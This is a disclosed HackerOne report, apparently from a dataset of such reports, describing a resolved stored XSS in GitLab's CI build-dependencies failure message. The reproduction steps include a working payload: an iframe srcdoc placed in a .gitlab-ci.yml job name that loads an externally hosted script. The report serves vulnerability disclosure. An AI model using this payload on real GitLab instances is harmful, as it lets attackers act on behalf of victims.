---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '950190'
original_report_id: '950190'
title: Store-XSS in error message of build-dependencies
weakness: Cross-site Scripting (XSS) - Stored
team_handle: gitlab
created_at: '2020-08-03T13:15:26.987Z'
disclosed_at: '2020-12-01T08:04:06.926Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 35
asset_identifier: Your Own GitLab Instance
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Store-XSS in error message of build-dependencies

## Metadata

- HackerOne Report ID: 950190
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: gitlab
- Disclosed At: 2020-12-01T08:04:06.926Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

A stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.

### Steps to reproduce

The following steps should to be reproduced in a self-managed installation of gitlab

1. Create an empty project
2. Go to "Settings/CI/CD/Runners" to setup a runner for this project
3. Create new file `.gitlab-ci.yml` for this project using the following content:

```yaml
test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:
  stage: build
  script: 
    - date > index.html
  artifacts:
    paths: 
      - index.html
    expire_in: 1 second

job-test:
  stage: test
  script: echo "hi"
  dependencies: ["test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"]
```

4. Wait for the jobs terminated, go to the detail of `job-test`
5. You should see an alert that contains the current url

### Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

### What is the current *bug* behavior?

The `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)

### What is the expected *correct* behavior?

The `failure_message` should be sanitized.

### Relevant logs and/or screenshots

Please see a screenshot in attached file

### Output of checks

#### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.9
Git Version:	2.27.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.2.2-ee
Revision:	618883a1f9d
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gl.local
HTTP Clone URL:	http://gl.local/some-group/some-project.git
SSH Clone URL:	git@gl.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
